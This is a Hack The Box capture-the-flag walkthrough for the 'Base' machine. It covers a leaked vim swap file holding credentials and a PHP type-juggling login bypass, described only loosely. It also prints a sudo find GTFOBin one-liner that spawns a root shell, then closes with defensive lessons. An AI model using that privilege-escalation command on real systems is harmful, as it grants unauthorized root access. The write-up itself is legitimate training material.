---
title: "Base — Hack The Box Walkthrough"
description: "Pwning Base through a swap-file credential leak, PHP type juggling, and a sudo file-copy GTFOBin."
date: 2026-09-02
category: offensive
readTime: "5 min read"
mitre:
  - "T1190"
  - "T1068"
tags:
  - "Hack The Box"
  - "Swap File"
  - "PHP"
  - "Type Juggling"
  - "sudo"
  - "Linux"
  - "CTF"
summary: "Pwning Base through a swap-file credential leak, PHP type juggling, and a sudo file-copy GTFOBin."
---

**Machine:** Base
**Difficulty:** Easy
**Key Techniques:** Swap file leak, PHP type juggling, sudo GTFOBin

---

## Enumeration

### Port Scanning

```
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp  open  http    Apache httpd 2.4.29 (Ubuntu) — Welcome to Base
```

---

## Exploitation

### Swap-File Leak

Directory brute-forcing discovers a **vim swap file** (e.g. `.config.php.swp`). Recovering it yields **plaintext credentials**.

### PHP Type Juggling / LFI

The admin login is vulnerable to **PHP type juggling** (`==` loose comparison) or accepts a manipulated value. Log in and reach a file-inclusion/RCE feature.

```
ssh user@10.129.95.184
```

```
user.txt: <flag>
```

---

## Privilege Escalation — Sudo GTFOBin

```bash
sudo -l
```

The user can run a file-copy/find binary with sudo. Use a GTFOBin one-liner:

```bash
sudo find . -exec /bin/bash \;
```

Root shell:

```
root.txt: <flag>
```

---

## Lessons Learned

1. **Remove swap files and vim backup files** from production — they leak source and credentials.
2. **Use strict `===` comparisons in PHP** to prevent type-juggling bypasses.
3. **Restrict `sudo` access** — any GTFOBin-capable binary (like `find`) grants root.
